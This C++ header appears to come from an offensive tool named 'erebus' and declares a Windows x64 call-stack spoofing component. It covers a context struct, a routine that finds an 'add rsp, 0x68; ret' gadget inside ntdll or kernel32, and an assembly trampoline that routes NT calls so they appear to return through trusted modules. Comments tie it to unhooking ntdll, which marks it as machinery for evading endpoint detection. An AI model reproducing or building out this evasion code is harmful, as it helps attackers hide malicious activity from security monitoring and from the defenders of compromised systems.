#ifndef EREBUS_EVASION_CALLSTACK_SPOOF_HPP
#define EREBUS_EVASION_CALLSTACK_SPOOF_HPP
#pragma once

#include <windows.h>
#include <cstddef>  // offsetof

namespace erebus {
namespace evasion {

// Describes a single spoofed NT function call.
// Populate Target, Gadget (from GetSpoofGadget()), Arg1-4, and optionally
// StackArgs/StackArgCount, then pass to SpoofCall().
//
// Gadget contract: must be `add rsp, 0x68; ret` (48 83 C4 68 C3) inside
// a trusted module (ntdll/kernel32). InitCallstackSpoof() locates this.
//
// Stack layout SpoofCall builds before JMPing to Target (target_rsp = entry_rsp - 112):
//   +  0  Gadget addr          <- Target RET
//   +  8  shadow[0]            zeroed
//   + 16  shadow[1]            zeroed
//   + 24  shadow[2]            zeroed
//   + 32  shadow[3]            zeroed
//   + 40  StackArgs[0]         arg5  (if StackArgCount >= 1)
//   + 48  StackArgs[1]         arg6
//   + 56  StackArgs[2]         arg7
//   + 64  StackArgs[3]         arg8
//   + 72  StackArgs[4]         arg9
//   + 80  StackArgs[5]         arg10
//   + 88  StackArgs[6]         arg11
//   + 96  StackArgs[7]         arg12
//   +104  <Target fn ptr>      temporary storage, never read by gadget
//   +112  real_return_addr     <- gadget (add rsp,0x68; ret) RET
//
// After Target RET -> Gadget executes `add rsp, 0x68; ret` -> real_return_addr.
// rax (Target's return value / NTSTATUS) is untouched by the gadget.
#pragma pack(push, 8)
struct SpoofContext {
    PVOID     Target;           // +0
    PVOID     Gadget;           // +8
    ULONG_PTR Arg1;             // +16
    ULONG_PTR Arg2;             // +24
    ULONG_PTR Arg3;             // +32
    ULONG_PTR Arg4;             // +40
    ULONG_PTR StackArgs[8];     // +48  (args 5-12; StackArgs[0] = arg5)
    ULONG     StackArgCount;    // +112 number of valid StackArgs entries (0-8)
    ULONG     _pad;             // +116
};
#pragma pack(pop)

static_assert(offsetof(SpoofContext, Target)        ==   0, "SpoofContext layout");
static_assert(offsetof(SpoofContext, Gadget)        ==   8, "SpoofContext layout");
static_assert(offsetof(SpoofContext, Arg1)          ==  16, "SpoofContext layout");
static_assert(offsetof(SpoofContext, Arg4)          ==  40, "SpoofContext layout");
static_assert(offsetof(SpoofContext, StackArgs)     ==  48, "SpoofContext layout");
static_assert(offsetof(SpoofContext, StackArgCount) == 112, "SpoofContext layout");
static_assert(sizeof(SpoofContext)                  == 120, "SpoofContext layout");

// One-time init. Searches ntdll, kernel32, kernelbase for `add rsp, 0x68; ret`.
// Call after UnhookNtdll(). Returns FALSE if no gadget found; SpoofCall will
// forward the call directly (no stack spoofing, but still functional).
BOOL InitCallstackSpoof();

// Returns the cached gadget address (NULL before InitCallstackSpoof succeeds).
PVOID GetSpoofGadget();

// x64 ASM trampoline (src/evasion/callstack_spoof.asm).
// Only volatile registers are used; non-volatile register state is fully
// preserved through the spoofed call.
// Returns the value Target placed in rax (NTSTATUS for Nt* functions).
extern "C" ULONG_PTR SpoofCall(SpoofContext* ctx);

} // namespace evasion
} // namespace erebus

#endif
